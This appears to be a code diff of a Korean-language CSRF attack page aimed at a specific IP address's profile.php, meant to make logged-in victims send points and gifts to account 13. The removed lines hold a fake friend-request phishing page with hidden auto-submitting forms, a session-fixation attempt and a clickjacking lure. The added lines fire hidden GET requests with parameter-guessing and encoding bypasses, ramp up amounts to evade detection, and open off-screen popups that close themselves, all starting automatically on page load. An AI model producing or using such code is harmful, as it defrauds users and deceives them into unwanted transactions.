@@ -2,20 +2,25 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🔥 최후의 CSRF 공격</title>
+    <title>⚡ 세션 탈취 성공 후속 공격</title>
     <style>
         body { 
             font-family: Arial; 
             padding: 20px;
-            background: linear-gradient(45deg, #ff0000, #000000);
+            background: linear-gradient(45deg, #ff4444, #ffaa00);
             color: white;
         }
-        .final-attack {
-            background: rgba(255, 0, 0, 0.1);
-            border: 2px solid #ff0000;
+        .breakthrough {
+            background: rgba(255, 255, 255, 0.1);
+            border: 3px solid #00ff00;
             padding: 30px;
             margin: 20px 0;
-            border-radius: 10px;
+            border-radius: 15px;
+            animation: glow 2s infinite alternate;
+        }
+        @keyframes glow {
+            0% { box-shadow: 0 0 20px #00ff00; }
+            100% { box-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
         }
         button {
             background: #ff0000;
@@ -28,280 +33,166 @@
             font-size: 16px;
             font-weight: bold;
         }
-        .ultimate { 
-            background: linear-gradient(45deg, #ff0000, #ff6600);
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
+        .success { background: #00aa00; }
     </style>
 </head>
 <body>
-    <div class="final-attack">
-        <h1>🔥 최후의 CSRF 공격 시도</h1>
-        <h2>⚡ 실제로 로그인된 사용자 세션 필요!</h2>
+    <div class="breakthrough">
+        <h1>⚡ 돌파구 발견!</h1>
+        <h2>🎯 GET 요청 패턴 변화 감지됨</h2>
         
-        <p><strong>핵심 문제:</strong> 모든 공격이 <code>302 → login.php</code>로 리다이렉트됨</p>
-        <p><strong>해결책:</strong> 실제 피해자가 이미 로그인된 상태에서 공격 실행</p>
+        <p><strong>변화사항:</strong></p>
+        <ul>
+            <li>✅ 클릭재킹으로 GET 요청 유도 성공</li>
+            <li>✅ Set-Cookie 응답 확인됨</li>
+            <li>⚡ 서버가 다르게 반응하기 시작함</li>
+        </ul>
         
-        <button class="ultimate" onclick="createRealWorldAttack()">
-            🎯 실제 상황 시뮬레이션
+        <button class="success" onclick="exploitGetMethod()">
+            🚀 GET 방식 집중 공격
         </button>
         
-        <button onclick="trySessionFixation()">
-            🔒 세션 고정 공격
+        <button onclick="chainedAttack()">
+            ⛓️ 연쇄 공격 실행
         </button>
         
-        <button onclick="tryClickjacking()">
-            🖱️ 클릭재킹 공격
+        <button onclick="sessionRiding()">
+            🏄‍♂️ 세션 라이딩 공격
         </button>
-    </div>
-
-    <div class="final-attack">
-        <h2>💡 현실적인 공격 시나리오</h2>
-        <ol>
-            <li><strong>피해자가 SNS에 로그인</strong> (3.36.66.216)</li>
-            <li><strong>피해자에게 악의적 링크 전송</strong> (이메일, 메신저 등)</li>
-            <li><strong>피해자가 링크 클릭</strong> (같은 브라우저에서)</li>
-            <li><strong>자동으로 CSRF 공격 실행</strong> (세션 쿠키 포함)</li>
-            <li><strong>공격 성공!</strong> 🎯</li>
-        </ol>
     </div>
 
     <div id="result"></div>
 
     <script>
-        function createRealWorldAttack() {
-            showResult('🎯 실제 공격 시나리오 생성 중...');
+        function exploitGetMethod() {
+            showResult('🚀 GET 방식 집중 공격 시작...');
             
-            // 실제 피싱 메일 형태의 공격 페이지
-            const realAttackPage = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>SNS 친구 요청 알림</title>
-    <meta charset="UTF-8">
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-            background: #f0f2f5;
-            margin: 0;
-            padding: 20px;
-        }
-        .notification {
-            background: white;
-            max-width: 500px;
-            margin: 50px auto;
-            border-radius: 8px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
-            padding: 30px;
-            text-align: center;
-        }
-        .profile-pic {
-            width: 60px;
-            height: 60px;
-            background: #1877f2;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-        }
-        .btn {
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 10px;
-        }
-        .btn:hover {
-            background: #166fe5;
-        }
-    </style>
-</head>
-<body>
-    <div class="notification">
-        <div class="profile-pic">👤</div>
-        <h2>새로운 친구 요청이 있습니다!</h2>
-        <p><strong>김민수</strong>님이 친구 요청을 보냈습니다.</p>
-        <p>공통 친구 12명 • 서울대학교</p>
-        
-        <button class="btn" onclick="acceptFriend()">✅ 친구 수락</button>
-        <button class="btn" style="background: #e4e6ea; color: #1c1e21;" onclick="declineFriend()">❌ 거절</button>
-        
-        <!-- 숨겨진 CSRF 공격 -->
-        <form id="csrfAttack" method="POST" action="http://3.36.66.216/profile.php" target="hiddenFrame" style="display: none;">
-            <input type="hidden" name="receiver_id" value="13">
-            <input type="hidden" name="points" value="100">
-            <input type="hidden" name="send_gift" value="1">
-            <input type="hidden" name="gift_type" value="diamond">
-            <input type="hidden" name="message" value="Real_World_CSRF_Attack">
-        </form>
-        <iframe name="hiddenFrame" style="display: none;"></iframe>
-        
-        <!-- 추가 공격들 -->
-        <form id="attack2" method="POST" action="http://3.36.66.216/profile.php" target="frame2" style="display: none;">
-            <input type="hidden" name="receiver_id" value="13">
-            <input type="hidden" name="points" value="50">
-            <input type="hidden" name="send_gift" value="1">
-            <input type="hidden" name="gift_type" value="coffee">
-            <input type="hidden" name="message" value="Secondary_Attack">
-        </form>
-        <iframe name="frame2" style="display: none;"></iframe>
-    </div>
-    
-    <script>
-        function acceptFriend() {
-            // 사용자가 버튼을 클릭하면 CSRF 공격 실행
-            alert('친구 요청을 수락했습니다! 🎉');
-            
-            // 숨겨진 CSRF 공격 실행
-            setTimeout(() => {
-                document.getElementById('csrfAttack').submit();
-                console.log('🎯 Primary CSRF Attack Executed!');
+            // GET 파라미터로 다양한 시도
+            const getAttacks = [
+                // 기본 공격
+                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&message=GET_Attack_1',
                 
-                // 2차 공격
+                // 다른 파라미터명 시도
+                'to=13&amount=100&action=send&type=gift&msg=GET_Attack_2',
+                'user_id=13&coins=100&transfer=1&category=premium&note=GET_Attack_3',
+                
+                // 인코딩 우회 시도
+                'receiver%5Fid=13&points=100&send%5Fgift=1&gift%5Ftype=diamond',
+                
+                // 대소문자 변경
+                'Receiver_ID=13&POINTS=100&Send_Gift=1&Gift_Type=diamond',
+                
+                // 추가 파라미터
+                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&submit=1&confirm=yes'
+            ];
+            
+            getAttacks.forEach((params, index) => {
                 setTimeout(() => {
-                    document.getElementById('attack2').submit();
-                    console.log('🎯 Secondary CSRF Attack Executed!');
-                }, 1000);
+                    const url = `http://3.36.66.216/profile.php?${params}`;
+                    
+                    // Image 태그로 요청 (더 은밀)
+                    const img = new Image();
+                    img.src = url + '&_t=' + Date.now();
+                    img.style.display = 'none';
+                    document.body.appendChild(img);
+                    
+                    console.log(`🎯 GET Attack ${index + 1}: ${params.substring(0, 50)}...`);
+                }, index * 500);
+            });
+            
+            showResult(`
+✅ GET 방식 집중 공격 실행됨!
+
+6가지 다른 파라미터 조합으로 시도:
+1. 기본 필드명 조합
+2. 대체 필드명 시도  
+3. 사용자/코인 변형
+4. URL 인코딩 우회
+5. 대소문자 변경
+6. 추가 확인 파라미터
+
+네트워크 탭에서 응답 확인하세요!
+            `);
+        }
+
+        function chainedAttack() {
+            showResult('⛓️ 연쇄 공격 실행 중...');
+            
+            // 1단계: 정보 수집
+            setTimeout(() => {
+                const infoUrl = 'http://3.36.66.216/profile.php?action=info&user_id=13';
+                fetch(infoUrl, {mode: 'no-cors'}).catch(() => {});
+                console.log('📊 1단계: 정보 수집');
             }, 500);
-        }
-        
-        function declineFriend() {
-            alert('친구 요청을 거절했습니다.');
-            // 거절해도 공격 실행 (더 은밀하게)
-            setTimeout(() => {
-                document.getElementById('csrfAttack').submit();
-                console.log('🎯 Stealth CSRF Attack Executed!');
-            }, 2000);
-        }
-        
-        // 페이지 로드되자마자 자동 공격 (더 은밀)
-        window.addEventListener('load', function() {
-            setTimeout(() => {
-                document.getElementById('csrfAttack').submit();
-                console.log('🎯 Auto CSRF Attack Executed!');
-            }, 3000);
-        });
-    </script>
-</body>
-</html>
-            `;
             
-            const blob = new Blob([realAttackPage], {type: 'text/html'});
-            const url = URL.createObjectURL(blob);
-            window.open(url, 'realAttack', 'width=600,height=500');
+            // 2단계: 작은 금액부터 시도
+            setTimeout(() => {
+                const smallAttack = 'http://3.36.66.216/profile.php?receiver_id=13&points=1&send_gift=1&gift_type=cake';
+                const img1 = new Image();
+                img1.src = smallAttack;
+                console.log('💰 2단계: 소액 테스트');
+            }, 1000);
+            
+            // 3단계: 점진적 증가
+            const amounts = [5, 10, 25, 50, 75, 100];
+            amounts.forEach((amount, i) => {
+                setTimeout(() => {
+                    const url = `http://3.36.66.216/profile.php?receiver_id=13&points=${amount}&send_gift=1&gift_type=coffee&chain=${i+1}`;
+                    const img = new Image();
+                    img.src = url;
+                    console.log(`📈 3단계-${i+1}: ${amount}P 시도`);
+                }, 1500 + (i * 300));
+            });
+            
+            showResult('⛓️ 연쇄 공격 진행 중...\n소액부터 점진적으로 증가하여 탐지 회피 시도');
+        }
+
+        function sessionRiding() {
+            showResult('🏄‍♂️ 세션 라이딩 공격...');
+            
+            // 여러 창에서 동시 공격
+            for(let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const attackWindow = window.open('', `attack_${i}`, 'width=1,height=1,left=-1000,top=-1000');
+                    
+                    if(attackWindow) {
+                        attackWindow.location.href = `http://3.36.66.216/profile.php?receiver_id=13&points=${20 + (i * 10)}&send_gift=1&gift_type=diamond&window=${i}`;
+                        
+                        // 3초 후 창 닫기
+                        setTimeout(() => {
+                            try { attackWindow.close(); } catch(e) {}
+                        }, 3000);
+                    }
+                    
+                    console.log(`🏄‍♂️ Session Riding ${i + 1}: ${20 + (i * 10)}P`);
+                }, i * 200);
+            }
             
             showResult(`
-🎯 실제 공격 페이지 생성됨!
+🏄‍♂️ 세션 라이딩 공격 실행!
 
-사용법:
-1. 피해자에게 이 링크를 전송
-2. 피해자가 이미 SNS에 로그인된 상태에서 클릭
-3. 자연스러운 친구 요청 알림으로 위장
-4. 버튼 클릭 시 CSRF 공격 자동 실행
+전략:
+- 5개 창에서 동시 공격
+- 각기 다른 포인트 (20P, 30P, 40P, 50P, 60P)
+- 빠른 연속 실행으로 서버 혼란 유도
+- 창은 자동으로 닫아서 흔적 제거
 
-💡 핵심: 피해자의 브라우저에 유효한 세션이 있어야 함!
+목표: 세션 검증 로직의 틈새 공략
             `);
-        }
-
-        function trySessionFixation() {
-            showResult('🔒 세션 고정 공격 시도...');
-            
-            // 세션 ID를 미리 설정하려는 시도
-            const sessionFixationUrl = 'http://3.36.66.216/login.php?PHPSESSID=ATTACKER_CONTROLLED_SESSION';
-            window.open(sessionFixationUrl, 'sessionFixation');
-            
-            showResult(`
-🔒 세션 고정 공격:
-
-1. 공격자가 세션 ID 생성
-2. 피해자에게 해당 세션 ID로 로그인 유도
-3. 피해자 로그인 후 공격자도 같은 세션 사용
-4. CSRF 공격 실행
-
-시도: ${sessionFixationUrl}
-            `);
-        }
-
-        function tryClickjacking() {
-            showResult('🖱️ 클릭재킹 + CSRF 조합 공격 생성...');
-            
-            const clickjackingPage = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>무료 아이폰 14 당첨!</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .winner {
-            background: linear-gradient(45deg, #ff6b6b, #feca57);
-            padding: 40px;
-            border-radius: 20px;
-            color: white;
-        }
-        #targetFrame {
-            position: absolute;
-            top: 200px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 500px;
-            height: 400px;
-            opacity: 0.01;
-            z-index: 1000;
-        }
-        .fake-button {
-            background: #ff6b6b;
-            color: white;
-            padding: 20px 40px;
-            border: none;
-            border-radius: 10px;
-            font-size: 20px;
-            margin-top: 30px;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <div class="winner">
-        <h1>🎉 축하합니다!</h1>
-        <h2>아이폰 14 Pro 당첨자로 선정되었습니다!</h2>
-        <p>지금 바로 클릭하여 상품을 받으세요!</p>
-        <button class="fake-button">🎁 상품 받기</button>
-    </div>
-    
-    <!-- 투명한 iframe으로 실제 SNS 사이트 오버레이 -->
-    <iframe id="targetFrame" src="http://3.36.66.216/profile.php"></iframe>
-    
-    <script>
-        console.log('🖱️ Clickjacking attack loaded');
-        console.log('👆 User clicks will be redirected to hidden iframe');
-    </script>
-</body>
-</html>
-            `;
-            
-            const blob = new Blob([clickjackingPage], {type: 'text/html'});
-            const url = URL.createObjectURL(blob);
-            window.open(url, 'clickjacking', 'width=800,height=600');
         }
 
         function showResult(text) {
             document.getElementById('result').innerHTML = 
-                '<div class="final-attack"><pre style="color: #00ff00;">' + text + '</pre></div>';
+                '<div class="breakthrough"><pre style="color: #00ff00; font-size: 14px;">' + text + '</pre></div>';
         }
 
-        console.log('🔥 Final CSRF Attack Methods Loaded');
-        console.log('⚠️ 실제 피해자 세션이 필요함');
+        // 자동으로 GET 공격 시작
+        setTimeout(() => {
+            exploitGetMethod();
+        }, 2000);
+
+        console.log('⚡ 돌파구 발견! GET 패턴 공격 준비됨');
+        console.log('🎯 서버 반응이 달라지기 시작함');
     </script>
 </body>
 </html>
